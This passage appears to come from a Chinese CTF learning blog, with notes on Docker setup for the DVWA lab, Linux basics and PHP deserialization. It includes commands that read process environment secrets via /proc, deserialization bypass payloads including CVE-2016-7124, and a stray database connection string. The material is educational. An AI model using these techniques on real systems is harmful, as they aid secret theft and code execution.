docker</span><br></pre></td></tr></table></figure><h2 id="二-拉取image"><a href="#二-拉取image" class="headerlink" title="二.拉取image"></a>二.拉取image</h2><p>找image（镜像）</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker search dvwa</span></span><br></pre></td></tr></table></figure><p>但是政策下来，指令有所改变（镜像站不暴露）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mirror.xxxx.club<span class="regexp">/citizenstig/</span>dvwa </span><br></pre></td></tr></table></figure><h2 id="三-布置容器"><a href="#三-布置容器" class="headerlink" title="三. 布置容器"></a>三. 布置容器</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker images  <span class="comment">//查看镜像</span></span><br><span class="line">docker run <span class="attr">--name</span> Dvwa -d -<span class="selector-tag">p</span> <span class="number">1314</span>:<span class="number">80</span>  citizenstig/dvwa  <span class="comment">//布置容器</span></span><br><span class="line">-p：指定映射端口</span><br><span class="line">-d：后台运行</span><br><span class="line"><span class="attr">--name</span>：容器命名为XXX</span><br></pre></td></tr></table></figure><p>我端口是1314，后面的80不能改，容器里的php服务默认跑在80端口。</p><h2 id="四-后续"><a href="#四-后续" class="headerlink" title="四. 后续"></a>四. 后续</h2><p>在网页上打开，创建数据库，账户密码输入admin，password即可。</p><h1 id="0x04搭建CTF题目环境"><a href="#0x04搭建CTF题目环境" class="headerlink" title="0x04搭建CTF题目环境"></a>0x04搭建CTF题目环境</h1><h2 id="一-上传项目到服务器"><a href="#一-上传项目到服务器" class="headerlink" title="一. 上传项目到服务器"></a>一. 上传项目到服务器</h2><p>个人使用WinSCP，优点是可视化比较好，微软的可视化一向比较nice。自己mkdir一个目录储存项目即可。</p><h2 id="二-构建Docker镜像"><a href="#二-构建Docker镜像" class="headerlink" title="二. 构建Docker镜像"></a>二. 构建Docker镜像</h2><p>在 <code>Dockerfile</code> 所在目录下，打开终端或命令提示符，执行以下命令来构建 Docker 镜像：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t your-app-<span class="keyword">name</span> .</span><br></pre></td></tr></table></figure><blockquote><p>这里的 <code>your-app-name</code> 是你给你的 Docker 镜像起的名字，<code>.</code> 指的是当前目录，即 Dockerfile 所在的目录。</p></blockquote><h2 id="三-运行Docker容器"><a href="#三-运行Docker容器" class="headerlink" title="三. 运行Docker容器"></a>三. 运行Docker容器</h2><p>镜像构建成功后，执行以下指令创建容器：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run <span class="attr">--name</span> <span class="selector-attr">[取个名字]</span> -d -<span class="selector-tag">p</span> <span class="number">1234</span>:<span class="number">80</span> your-app-name</span><br></pre></td></tr></table></figure><h2 id="四-后续-1"><a href="#四-后续-1" class="headerlink" title="四.后续"></a>四.后续</h2><p>登录网页即可验证。</p><h1 id="0x05-删除容器和镜像"><a href="#0x05-删除容器和镜像" class="headerlink" title="0x05 删除容器和镜像"></a>0x05 删除容器和镜像</h1><h2 id="·-先删除正在运行的容器"><a href="#·-先删除正在运行的容器" class="headerlink" title="· 先删除正在运行的容器"></a>· 先删除正在运行的容器</h2><p>查看正在运行的容器：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure><p>停止正在运行的容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;容器ID或名称&gt;</span><br></pre></td></tr></table></figure><p>删除目标容器：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm  <span class="tag">&lt;<span class="name">容器ID或名称</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="·-再删除目标镜像"><a href="#·-再删除目标镜像" class="headerlink" title="· 再删除目标镜像"></a>· 再删除目标镜像</h2><p>查看镜像：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p>删除镜像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi IMAGE_ID</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 入门</title>
      <link href="/2024/03/18/Linux-%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/Linux-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>总觉得学的不扎实，认真学一次。</p><p>mongodb+srv:&#x2F;&#x2F;2472373483:<password>@pax-blog.fu8mfyq.mongodb.net&#x2F;?retryWrites&#x3D;true&amp;w&#x3D;majority&amp;appName&#x3D;pax-blog</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>概述：</p><blockquote><p>Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。</p></blockquote><p>系统启动进程：</p><ul><li>内核的引导。</li><li>运行 init。</li><li>系统初始化。</li><li>建立终端 。</li><li>用户登录系统。</li></ul><p>目录结构：</p><p>由根目录出发的树状目录结构。</p><p>查阅：<a href="https://www.runoob.com/linux/linux-system-contents.html">https://www.runoob.com/linux/linux-system-contents.html</a></p><hr><h2 id="目录与文件管理"><a href="#目录与文件管理" class="headerlink" title="目录与文件管理"></a>目录与文件管理</h2><h3 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h3><blockquote><ul><li><p><strong>绝对路径：</strong><br>路径的写法，由根目录 <strong>&#x2F;</strong> 写起，例如： &#x2F;usr&#x2F;share&#x2F;doc 这个目录。</p></li><li><p><strong>相对路径：</strong><br>路径的写法，不是由 <strong>&#x2F;</strong> 写起，例如由 &#x2F;usr&#x2F;share&#x2F;doc 要到 &#x2F;usr&#x2F;share&#x2F;man 底下时，可以写成： <strong>cd ..&#x2F;man</strong> 这就是相对路径的写法。</p></li></ul></blockquote><p>很好理解，简单来说就是开头目录是谁而已。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="ls-列出目录"><a href="#ls-列出目录" class="headerlink" title="ls(列出目录)"></a><strong>ls</strong>(列出目录)</h4><p>参数：</p><ul><li>-a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)</li><li>-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)</li><li>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)</li></ul><h4 id="cd-切换目录"><a href="#cd-切换目录" class="headerlink" title="cd(切换目录)"></a><strong>cd</strong>(切换目录)</h4><h4 id="pwd-显示当前目录"><a href="#pwd-显示当前目录" class="headerlink" title="pwd(显示当前目录)"></a><strong>pwd</strong>(显示当前目录)</h4><p>参数：</p><ul><li>-P ：显示出确实的路径，而非使用链接 (link) 路径。</li></ul><blockquote><p>实例显示出实际的工作目录，而非链接档本身的目录名而已。</p></blockquote><h4 id="mkdir-创建新目录"><a href="#mkdir-创建新目录" class="headerlink" title="mkdir (创建新目录)"></a><strong>mkdir</strong> (创建新目录)</h4><p>参数：</p><ul><li>-m ：直接配置文件的权限</li><li>-p ：将所需要的目录(包含上一级目录)递归创建起来</li></ul><h4 id="rmdir-删除空的目录"><a href="#rmdir-删除空的目录" class="headerlink" title="rmdir(删除空的目录)"></a><strong>rmdir</strong>(删除空的目录)</h4><p>参数：</p><ul><li>-p ：从该目录起，一次删除多级空目录</li></ul><p><strong>cp</strong>(复制文件或目录)</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -<span class="selector-tag">p</span> <span class="selector-tag">from</span> <span class="selector-tag">to</span></span><br></pre></td></tr></table></figure><h4 id="rm-移除文件或目录"><a href="#rm-移除文件或目录" class="headerlink" title="rm(移除文件或目录)"></a><strong>rm</strong>(移除文件或目录)</h4><p>参数：</p><ul><li>-f ：就是 force 的意思，忽略不存在的文件，不会出现警告信息；</li><li>-i ：互动模式，在删除前会询问使用者是否动作</li><li>-r ：递归删除啊！最常用在目录的删除了！这是非常危险的选项！！！</li></ul><h4 id="mv-移动文件与目录，或修改名称"><a href="#mv-移动文件与目录，或修改名称" class="headerlink" title="mv (移动文件与目录，或修改名称)"></a><strong>mv</strong> (移动文件与目录，或修改名称)</h4><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv -<span class="selector-tag">p</span> <span class="selector-tag">from</span> <span class="selector-tag">to</span></span><br></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；</li><li>-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</li><li>-u ：若目标文件已经存在，且 source 比较新，才会升级 (update)</li></ul><h4 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h4><ul><li>cat 由第一行开始显示文件内容</li><li>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！</li><li>nl  显示的时候，顺道输出行号！</li><li>more 一页一页的显示文件内容</li><li>less 与 more 类似，但是比 more 更好的是，他可以往前翻页！</li><li>head 只看头几行</li><li>tail 只看尾巴几行</li></ul><h2 id="用户与用户组管理"><a href="#用户与用户组管理" class="headerlink" title="用户与用户组管理"></a>用户与用户组管理</h2><h3 id="创建账号"><a href="#创建账号" class="headerlink" title="创建账号"></a>创建账号</h3><p>语法：useradd -p username</p><p>允许多个参数并列</p><p>参数：</p><ul><li>-c comment 指定一段注释性描述。</li><li>-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。</li><li>-g 用户组 指定用户所属的用户组。</li><li>-G 用户组，用户组 指定用户所属的附加组。</li><li>-s Shell文件 指定用户的登录Shell。</li><li>-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</li></ul><p>例子：</p><p>useradd –d  &#x2F;home&#x2F;sam -m sam</p><p>useradd -s &#x2F;bin&#x2F;sh -g group –G adm,root gem</p><h3 id="删除账号"><a href="#删除账号" class="headerlink" title="删除账号"></a>删除账号</h3><p>语法：userdel -p username</p><blockquote><p>常用的选项(参数)是 <strong>-r</strong>，它的作用是把用户的主目录一起删除。</p><p>例如：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># userdel -r sam</span></span><br></pre></td></tr></table></figure><p>此命令删除用户sam在系统文件中（主要是&#x2F;etc&#x2F;passwd, &#x2F;etc&#x2F;shadow, &#x2F;etc&#x2F;group等）的记录，同时删除用户的主目录。</p></blockquote><h3 id="修改账号"><a href="#修改账号" class="headerlink" title="修改账号"></a>修改账号</h3><p>语法：usermod -p username</p><p>参数如创建账号所写</p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><h4 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h4><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><blockquote><p>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。</p><p>Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。</p><p>Ken Thompson 的 sh 是第一种 Unix Shell，Windows Explorer 是一个典型的图形界面 Shell。</p></blockquote><h5 id="shell环境"><a href="#shell环境" class="headerlink" title="shell环境"></a>shell环境</h5><blockquote><p>Shell 编程跟 JavaScript、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。</p><p>在一般情况下，人们并不区分 Bourne Shell 和 Bourne Again Shell，所以，像 <strong>#!&#x2F;bin&#x2F;sh</strong>，它同样也可以改为 <strong>#!&#x2F;bin&#x2F;bash</strong>。</p><p><strong>#!</strong> 告诉系统其后路径所指定的程序即是解释此脚本文件的 Shell 程序。</p></blockquote><h5 id="运行shell脚本"><a href="#运行shell脚本" class="headerlink" title="运行shell脚本"></a>运行shell脚本</h5><p>第一个方法：<strong>作为可执行程序</strong></p><p>第二个方法：<strong>作为解释器参数</strong></p><p>这种运行方式是，直接运行解释器，其参数就是 shell 脚本的文件名，如：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/<span class="keyword">sh</span> <span class="keyword">test</span>.<span class="keyword">sh</span></span><br><span class="line">/bin/php <span class="keyword">test</span>.php</span><br></pre></td></tr></table></figure><h4 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h4><p>1.定义变量不需要符号，变量赋值时等号两边没有空格，剩下的与C语言类似，如下：</p><ul><li><strong>只包含字母、数字和下划线：</strong> 变量名可以包含字母（大小写敏感）、数字和下划线 **_**，不能包含其他特殊字符。</li><li><strong>不能以数字开头：</strong> 变量名不能以数字开头，但可以包含数字。</li><li><strong>避免使用 Shell 关键字：</strong> 不要使用Shell的关键字（例如 if、then、else、fi、for、while 等）作为变量名，以免引起混淆。</li><li><strong>使用大写字母表示常量：</strong> 习惯上，常量的变量名通常使用大写字母，例如 <strong>PI&#x3D;3.14</strong>。</li><li><strong>避免使用特殊符号：</strong> 尽量避免在变量名中使用特殊符号，因为它们可能与 Shell 的语法产生冲突。</li><li><strong>避免使用空格：</strong> 变量名中不应该包含空格，因为空格通常用于分隔命令和参数。</li></ul><p>2.使用已定义变量时前面加一个$，最好在变量名外围加一个花括号，如：${name}</p><p>3.只读变量：使用 readonly 命令可以将变量定义为只读变量，只读变量的值不能被改变。</p><p>4.删除变量：</p><p>使用 unset 命令可以删除变量。语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> variable_name</span><br></pre></td></tr></table></figure><p>变量被删除后不能再次使用。unset 命令不能删除只读变量。</p><h2 id="proc目录"><a href="#proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h2><p>推荐文章：<a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用-安全客 - 安全资讯平台 (anquanke.com)</a></p><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><blockquote><p>Linux系统上的&#x2F;proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p><p>简单来讲，<code>/proc</code> 目录即保存在系统内存中的信息，大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。</p></blockquote><p>&#x2F;proc目录下有数字进程也有字符串，我们一般用<code>1</code>或者<code>self</code></p><p>下面说一下进程下比较重要的目录和文件</p><h3 id="cmdline（文件而非目录）"><a href="#cmdline（文件而非目录）" class="headerlink" title="cmdline（文件而非目录）"></a>cmdline（文件而非目录）</h3><blockquote><p>cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令</p></blockquote><p>example：<code>cat /proc/1/cmdline</code> </p><p>其实通过<code>cat</code>可知cmdline是个文件而不是目录，使用<code>ls</code>并没有效果</p><h3 id="cwd-一个符号链接"><a href="#cwd-一个符号链接" class="headerlink" title="cwd(一个符号链接)"></a>cwd(一个符号链接)</h3><blockquote><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录</p></blockquote><blockquote><p>符号链接是一种特殊类型的文件，它包含了对另一个文件或目录的引用。通过读取<code>/proc/1/cwd</code>可以获取进程ID为1的进程的当前工作目录的路径信息。</p></blockquote><p>example：<code>ls -al /proc/1/cwd</code></p><p>通过cwd返回的是一个字典，具体的还不会说，不过不能用<code>cat</code>，使用<code>ls</code></p><h3 id="exe-一个符号链接"><a href="#exe-一个符号链接" class="headerlink" title="exe(一个符号链接)"></a>exe(一个符号链接)</h3><blockquote><p>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</p></blockquote><p>example：<code>ls -al /proc/1/exe</code></p><p>可以cat试试，好像跟逆向有关</p><h3 id="environ（文件而非目录）"><a href="#environ（文件而非目录）" class="headerlink" title="environ（文件而非目录）"></a>environ（文件而非目录）</h3><blockquote><p>environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息。常用来读取环境变量中的SECRET_KEY或FLAG。</p></blockquote><p>example：cat &#x2F;proc&#x2F;1&#x2F;environ</p><p>使用<code>cat</code>而非<code>ls</code></p><h3 id="fd（目录而非文件）"><a href="#fd（目录而非文件）" class="headerlink" title="fd（目录而非文件）"></a>fd（目录而非文件）</h3><blockquote><p>fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。</p></blockquote><p>example：<code>ls -al /proc/1/fd</code></p><p>查看指定进程打开的某个文件的内容：<code>ls -al /proc/1/fd/7</code></p><blockquote><p><strong>这个fd比较重要，因为在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 反序列化入门</title>
      <link href="/2024/03/18/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="PHP反序列化入门"><a href="#PHP反序列化入门" class="headerlink" title="PHP反序列化入门"></a>PHP反序列化入门</h1><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">序列化:将变量转换为可保存或传输的字符串的过程；</span></span><br><span class="line"><span class="section">反序列化:在适当的时候把这个字符串再转化成原来的变量使用。</span></span><br><span class="line"><span class="section">优点:这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</span></span><br></pre></td></tr></table></figure><p>举个栗子：将木桌拆分成木块，是为序列化；将木块重组成木桌，是为反序列化。</p><h4 id="PHP序列化的字母标识："><a href="#PHP序列化的字母标识：" class="headerlink" title="PHP序列化的字母标识："></a>PHP序列化的字母标识：</h4><blockquote><p><code>a - array</code></p><p><code>b - boolean</code></p><p><code>d - double</code></p><p><code>i - integer</code></p><p><code>o - common object</code></p><p><code>r - reference</code></p><p><code>s - string</code></p><p><code>C - custom object</code></p><p><code>O - class</code></p><p><code>N - null</code></p><p><code>R - pointer reference</code></p><p><code>U - unicode string</code></p><p><code>N - NULL</code></p></blockquote><p>解释：</p><ul><li><strong>a - 数组（array）：</strong> 通常指存储相同类型元素的数据结构，这些元素在内存中是连续存储的。数组具有索引，可以有效地访问元素。</li><li><strong>b - 布尔（boolean）：</strong> 布尔是一种数据类型，只能取两个值，通常为true（真）或false（假）。它通常用于条件表达式。</li><li><strong>d - 双精度浮点数（double）：</strong> Double是一种用于表示带有双精度的浮点数（带有小数点的数）的数据类型。</li><li><strong>i - 整数（integer）：</strong> 整数是一种用于表示没有小数点的整数的数据类型。它可以是正数或负数。</li><li><strong>o - 通用对象（common object）：</strong> 这通常指编程上的一般对象。术语“通用对象”可能会根据特定的上下文或编程语言而有所不同。</li><li><strong>r - 引用（reference）：</strong> 引用是一个值，它引用另一个对象的内存位置。通常用于避免复制大量数据。</li><li><strong>s - 字符串（string）：</strong> 字符串是字符的序列。在编程中，它是用于表示文本的数据类型。</li><li><strong>C - 自定义对象（custom object）：</strong> 这指的是自定义类的对象，自定义类是面向对象编程中用户定义的数据类型。</li><li><strong>O - 类（class）：</strong> 在面向对象编程中，类是创建对象的蓝图。对象是类的实例，可以具有属性和方法。</li><li><strong>N - 空（null）：</strong> Null是一个特殊的值，表示没有值或不指向任何对象的引用。</li><li><strong>R - 指针引用（pointer reference）：</strong> 这可能是指使用指针实现的引用。指针存储内存地址，通常用于更直接的内存操作。</li><li><strong>U - Unicode字符串（unicode string）：</strong> Unicode字符串是使用Unicode标准编码的字符序列，可以表示各种书写系统中的广泛字符。</li><li><strong>N - 空（NULL）：</strong> 类似于前面的“null”，这可能指的是空值或没有值。确切的解释可能取决于特定的编程语言或上下文。</li></ul><h4 id="private和-protected详解"><a href="#private和-protected详解" class="headerlink" title="private和 protected详解"></a>private和 protected详解</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 序列化的时候 <span class="keyword">private</span>和 <span class="keyword">protected</span> 变量会引入不可见字符<span class="variable">%00</span>，<span class="variable">%00</span>类名<span class="variable">%00</span>属性名 为<span class="keyword">private</span>，<span class="variable">%00</span>*<span class="variable">%00</span>属性名 为<span class="keyword">protected</span>，注意这两个 <span class="variable">%00</span>就是 ascii 码为<span class="number">0</span> 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚.我们可以将序列化的字符用urlencode编码之后<span class="punctuation">,</span>打印出来查看.</span><br></pre></td></tr></table></figure><h4 id="PHP常见魔术方法"><a href="#PHP常见魔术方法" class="headerlink" title="PHP常见魔术方法"></a>PHP常见魔术方法</h4><blockquote><p>__construct 当一个对象创建时被调用，</p><p>__destruct 当一个对象销毁时被调用，</p><p>__toString 当一个对象被当作一个字符串被调用。</p><p>__wakeup() 使用unserialize时触发</p><p>__sleep() 使用serialize时触发</p><p>__call() 对不存在的方法或者不可访问的方法进行调用就自动调用</p><p>__callStatic() 在静态上下文中调用不可访问的方法时触发</p><p>__get() 用于从不可访问的属性读取数据</p><p>__set() 在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</p><p>__isset() 在不可访问的属性上调用isset()或empty()触发</p><p>__unset() 在不可访问的属性上使用unset()时触发</p><p>__toString() 把类当作字符串使用时触发,返回值需要为字符串</p><p>__invoke() 当脚本尝试将对象调用为函数时触发，该对象必须是直接拥有<code>__invoke()</code>魔术方法的对象</p></blockquote><p>详细介绍：<a href="https://www.freebuf.com/articles/web/347246.html">PHP反序列化入门手把手详解 - FreeBuf网络安全行业门户</a></p><h3 id="魔术方法执行顺序"><a href="#魔术方法执行顺序" class="headerlink" title="魔术方法执行顺序"></a>魔术方法执行顺序</h3><p>推荐文章：[<a href="https://juejin.cn/post/7306019536812326946#heading-13">CTF&#x2F;Web] PHP 反序列化学习笔记 - 掘金 (juejin.cn)</a></p><blockquote><p>对于魔术方法的调用顺序, 不同的情况下会有不同的顺序</p><p>首先, 一个对象在其生命周期中一定会走过 <code>destruct</code>, 只有当对象没有被任何变量指向时才会被回收</p><p>当使用 <code>new</code> 关键字来创建一个对象时会调用 <code>construct</code></p></blockquote><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>推荐文章：<a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</a></p><h4 id="绕过-wakeup-CVE-2016-7124"><a href="#绕过-wakeup-CVE-2016-7124" class="headerlink" title="绕过__wakeup()(CVE-2016-7124)"></a>绕过__wakeup()(CVE-2016-7124)</h4><p>条件：<strong>php版本 PHP5&lt;5.6.25，PHP7 &lt; 7.0.10</strong></p><p>须知：__wakeup()魔术方法在执行<code>unserialize()</code>时，会<strong>优先</strong>调用这个函数，而不会执行<code>__construct()</code> 函数</p><p>绕过方法：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行**</p><p>举个栗子： <code>O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;</code></p><p>改成：O:4:”test”:10000086:{s:1:”a”;s:3:”abc”;}</p><p>反序列化时不会执行__wakeup()</p><h4 id="绕过-destruct"><a href="#绕过-destruct" class="headerlink" title="绕过__destruct()"></a>绕过__destruct()</h4><blockquote><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct`是PHP对象的一个魔术方法，称为析构函数，顾名思义这是当该对象被销毁的时候自动执行的一个函数。其中以下情况会触发`__destruct</span><br></pre></td></tr></table></figure><ul><li><p>主动调用<code>unset($obj)</code></p></li><li><p>主动调用<code>$obj = NULL</code></p></li><li><p>程序自动结束</p></li></ul></blockquote><blockquote><p>PHP还拥有<strong>垃圾回收Garbage collection</strong>即我们常说的<strong>GC机制</strong>。</p><p><strong>当一个对象没有任何引用</strong>的时候，则会被视为“垃圾”</p></blockquote><h4 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h4><blockquote><p>如<code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p><p>绕过方法</p><ul><li>利用加号绕过（注意在url里传参时+要编码为%2B）</li><li>利用数组对象绕过，如 <code>serialize(array($a));</code> a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</li></ul></blockquote><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// 将对象放入数组绕过 serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="利用引用绕过"><a href="#利用引用绕过" class="headerlink" title="利用引用绕过"></a>利用引用绕过</h4><blockquote><p>在 PHP 中，引用是一种变量的别名。当你创建一个变量并将其赋值给另一个变量时，这两个变量实际上引用了相同的数据。这意味着对其中一个变量的更改也会影响到另一个变量，因为它们指向相同的内存位置。</p></blockquote><blockquote><p><code>$a = 5;</code></p><p><code>$b = &amp;$a; // $b 现在是 $a 的引用</code></p></blockquote><blockquote><p><code>echo $a; // 输出 5 </code></p><p><code>echo $b; // 输出 5 </code></p></blockquote><blockquote><p><code>$a = 10; // 修改 $a </code></p><p><code>echo $b; // 输出 10，因为 $b 是 $a 的引用</code></p></blockquote><p>跟C语言的指针不同</p><h4 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h4><p>序列字符串中<strong>表示字符类型的s大写时，会被当成16进制解析。</strong></p><p>没见过，先不记笔记。</p><h3 id="POP链构造"><a 